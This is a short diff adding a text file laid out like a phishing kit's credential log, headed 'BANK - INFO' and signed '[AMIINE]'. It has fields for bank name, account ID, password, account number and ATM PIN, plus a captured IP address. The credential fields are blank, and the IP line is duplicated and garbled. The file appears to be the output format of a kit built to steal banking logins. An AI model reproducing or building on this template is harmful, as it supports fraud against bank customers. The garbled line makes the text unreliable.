@@ -1,0 +1,10 @@
+
+|---------------- BANK - INFO ---------------|
+|Bank Name        : 
+|Account ID       : 
+|Password         : 
+|Account Number   : 
+|ATM PIN          : 
+|IP Adresse       : 176.26.65.39P Adresse       : 176.26.65.39
+|---------------------------------------------|
+|--------------By [AMIINE]--------------|
